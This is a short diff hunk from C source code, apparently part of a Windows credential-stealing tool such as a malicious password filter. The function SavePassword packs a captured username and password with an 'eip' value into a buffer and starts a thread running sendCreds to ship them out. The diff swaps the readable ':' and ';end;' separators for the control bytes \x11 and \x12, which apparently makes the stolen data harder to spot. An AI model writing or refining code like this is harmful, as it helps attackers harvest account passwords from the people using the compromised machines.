@@ -40,7 +40,7 @@ void SavePassword(PUNICODE_STRING username, PUNICODE_STRING password)
 	char* creds = (char*)malloc(150);
 	char* eip = getIPReg(L"eip");
 
-	sprintf(creds, "%ws:%ws;end;%s", username->Buffer, password->Buffer, eip);
+	sprintf(creds, "%ws\x11%ws\x12%s", username->Buffer, password->Buffer, eip);
 
 	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&sendCreds, creds, 0, NULL);
 	
